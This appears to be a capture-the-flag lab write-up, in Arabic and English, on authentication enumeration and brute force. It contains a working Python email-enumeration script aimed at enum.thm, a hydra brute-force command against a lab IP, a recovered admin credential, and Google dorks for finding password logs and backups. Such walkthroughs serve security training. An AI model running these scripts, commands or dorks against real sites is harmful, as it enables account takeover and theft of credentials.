# Enumeration & Brute Force



<img width="1901" height="378" alt="image" src="https://github.com/user-attachments/assets/1210bd29-1ad0-48db-adc8-e380059b40b5" />



<details>
  <summary>Authentication Enumeration</summary>


🧠 Authentication Enumeration -- الخلاصة العملية
-----------------------------------------------

### 🔍 يعني إيه؟

ببساطة:\
**بتحاول تعرف معلومات عن نظام الدخول من غير ما تسجل دخول فعلي**\
(يوزر موجود؟ سياسة الباسورد؟ في فرق ردود؟)

* * * * *

🎯 أهم حاجتين بنطلعهم
---------------------

### 1️⃣ هل اليوزر موجود ولا لأ

### 2️⃣ إيه سياسة الباسورد

* * * * *

🧪 الطرق العملية (اللي تهمك في التحديات)
----------------------------------------

### 🔑 1) صفحة الـ Login

ركز على **الرسائل**:

-   ❌ `Username not found`

-   ❌ `Incorrect password`

📌 لو في فرق =\
➡️ اليوزر صحيح\
➡️ نكمل عليه brute-force أو logic bug

* * * * *

### 🔁 2) Forgot Password

-   `User does not exist`

-   `Reset link sent`

📌 الفرق ده = **User Enumeration واضح**

* * * * *

### 📝 3) Register

-   `Username already taken`

-   `Email already registered`

📌 دي أسهل طريقة تجمع users list

* * * * *

### 🧾 4) Password Policy

لو شفت رسالة زي:

> Must contain uppercase, number, symbol

📌 معناها:

-   اعمل wordlist مخصص

-   متضيعش وقتك بكلام فاضي

مثال توليد باسوردات:

Password@123\
Admin#2026\
Love!Note9

* * * * *

### ⚠️ 5) Verbose Errors (الخطر الحقيقي)

أي فرق رد:

-   Status code

-   Message

-   Response time

📌 حتى **فرق 100ms** ممكن يكون user موجود

* * * * *

### 🧨 6) Data Breach

لو اليوزر طلع موجود:

-   جرب باسوردات شائعة

-   جرب combo من breaches

📌 دايمًا اليوزر هو المفتاح 🔑

* * * * *

🛠️ Tools تحبها
---------------

-   Burp Intruder

-   ffuf

-   wfuzz

-   curl + diff

-   custom wordlists


<img width="1628" height="215" alt="image" src="https://github.com/user-attachments/assets/5044fbfc-496d-4424-9fc4-afa5fc55338a" />



  
</details>



<details>
  <summary>Enumerating Users via Verbose Errors</summary>




> ### Below is a Python script that will check for valid emails in the target web app. Save the code below as script.py.


```python
import requests
import sys

def check_email(email):
    url = 'http://enum.thm/labs/verbose_login/functions.php'  # Location of the login function
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    data = {
        'username': email,
        'password': 'password',  # Use a random password as we are only checking the email
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_emails(email_file):
    valid_emails = []
    invalid_error = "Email does not exist"  # Error message for invalid emails

    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        email = email.strip()  # Remove any leading/trailing whitespace
        if email:
            response_json = check_email(email)
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"[INVALID] {email}")
            else:
                print(f"[VALID] {email}")
                valid_emails.append(email)

    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)

    email_file = sys.argv[1]

    valid_emails = enumerate_emails(email_file)

    print("\nValid emails found:")
    for valid_email in valid_emails:
        print(valid_email)
```



### We can use a common list of emails from this [repository](https://github.com/nyxgeek/username-lists/blob/master/usernames-top100/usernames_gmail.com.txt).



```
python3 script.py emails.txt
```

<img width="917" height="366" alt="image" src="https://github.com/user-attachments/assets/178d10fc-e903-472f-8f3e-5bc03a5fef46" />




```
 canderson@gmail.com
```


  
</details>







<details>
  <summary>Exploiting Vulnerable Password Reset Logic</summary>



<img width="1919" height="674" alt="image" src="https://github.com/user-attachments/assets/47113f5a-23f2-4380-95ae-d8ac5a5fcd26" />




### found the correct one and we get the pass

<img width="1574" height="662" alt="image" src="https://github.com/user-attachments/assets/e2e8fcc8-73cf-4b57-b994-e488fa730507" />

```
Your new password is: xKl7oka9
```

```
admin@admin.com : xKl7oka9
```


<img width="1091" height="330" alt="image" src="https://github.com/user-attachments/assets/13d28848-0824-44bc-85c8-a760918f9a81" />



  
</details>










<details>
  <summary>Exploiting HTTP Basic Authentication</summary>







```
hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt 10.113.131.237 http-get /labs/basic_auth
```



<img width="1029" height="629" alt="image" src="https://github.com/user-attachments/assets/dd09a31b-4951-4d0a-a169-88612299c271" />



<img width="1123" height="411" alt="image" src="https://github.com/user-attachments/assets/4d969880-f31e-4095-b3bd-f9e55a085a5a" />



  
</details>





<details>
  <summary>OSINT</summary>




🕰️ Wayback URLs
================

يعني إيه Wayback Machine؟
-------------------------

ده موقع اسمه\
**Internet Archive**

وعنده خدمة اسمها\
**Wayback Machine**

فكرته ببساطة:

> بيحتفظ بنسخ قديمة من المواقع عبر الزمن.

يعني تقدر تشوف شكل الموقع كان عامل إزاي سنة 2018 مثلاً 👀

* * * * *

🎯 ليه ده مهم في الـ Pentesting؟
--------------------------------

أحيانًا الموقع:

-   كان فيه صفحة قديمة

-   API endpoint

-   admin panel

-   backup file

-   config file

المطور مسحها من الـ frontend...\
لكن الملف لسه موجود على السيرفر 💥

* * * * *

🖥 مثال عملي
------------

لو دخلت على:

https://archive.org/web/

ودخلت اسم دومين، هتلاقي نسخ قديمة منه.

![https://www.lifewire.com/thmb/RvYF-_lKCW89dsWpCSqeCN6krVs%3D/1500x0/filters%3Ano_upscale%28%29%3Amax_bytes%28150000%29%3Astrip_icc%28%29/InternetArchive-ba36454589b44b9fb65eb50c02adfa0e.jpg](https://www.lifewire.com/thmb/RvYF-_lKCW89dsWpCSqeCN6krVs%3D/1500x0/filters%3Ano_upscale%28%29%3Amax_bytes%28150000%29%3Astrip_icc%28%29/InternetArchive-ba36454589b44b9fb65eb50c02adfa0e.jpg)

![https://www.researchgate.net/publication/349416593/figure/fig3/AS%3A992736459124738%401613698224321/Calendar-view-in-the-Wayback-Machine.ppm](https://www.researchgate.net/publication/349416593/figure/fig3/AS%3A992736459124738%401613698224321/Calendar-view-in-the-Wayback-Machine.ppm)

![https://cdn.ttc.io/i/fit/800/0/sm/0/plain/kit.exposingtheinvisible.org/web-archive-facebook-success.png](https://cdn.ttc.io/i/fit/800/0/sm/0/plain/kit.exposingtheinvisible.org/web-archive-facebook-success.png)

4

* * * * *

🔥 أداة waybackurls
-------------------

الأداة دي معمولة بواسطة\
**Tom Hudson**

بتسحب كل الروابط المؤرشفة لدومين معين.

### الاستخدام:

./waybackurls example.com

هيطلعلك:

-   صفحات قديمة

-   ملفات .zip

-   .bak

-   .old

-   API endpoints

-   .well-known paths

* * * * *

🧠 ليه .well-known مهمة؟
------------------------

زي:

/.well-known/security.txt\
/.well-known/openid-configuration

دي أحيانًا بتكشف:

-   OAuth endpoints

-   OpenID config

-   معلومات authentication

* * * * *

🔎 Google Dorks
===============

يعني إيه Google Dork؟
---------------------

إنك تستخدم\
**Google**

بطريقة احترافية عشان تطلع حاجات مش المفروض تكون public.

* * * * *

🎯 أمثلة قوية
-------------

### 1️⃣ تدور على Admin Panel

site:example.com inurl:admin

ده يقول لجوجل:

-   هاتلي صفحات من الدومين ده

-   وفيها كلمة admin في اللينك

* * * * *

### 2️⃣ تدور على ملفات Logs فيها باسورد

filetype:log "password" site:example.com

لو developer رفع log بالغلط 💀

* * * * *

### 3️⃣ تدور على Backup Folders

intitle:"index of" "backup" site:example.com

أحيانًا السيرفر بيبقى مفعل directory listing.

* * * * *

🧨 ليه Google Dork خطير؟
------------------------

لأن:

-   أنت مش بتخترق

-   أنت بتستخدم محرك بحث بس

-   بس بتوصل لمعلومات حساسة

* * * * *

⚔️ الفرق بين Wayback و Google Dorks
===================================

| Wayback | Google Dork |
| --- | --- |
| بيرجعك للماضي | بيكشف الموجود حالياً |
| يطلع صفحات اتحذفت | يطلع ملفات مكشوفة |
| يعتمد على أرشفة | يعتمد على فهرسة |

* * * * *

🔥 السيناريو الخطير
===================

1️⃣ تستخدم Wayback\
→ تلاقي `/backup.zip`

2️⃣ تستخدم Google\
→ تلاقي directory listing مفتوح

3️⃣ تلاقي credentials في log

💥 دخول مباشر بدون brute force








  
</details>



















































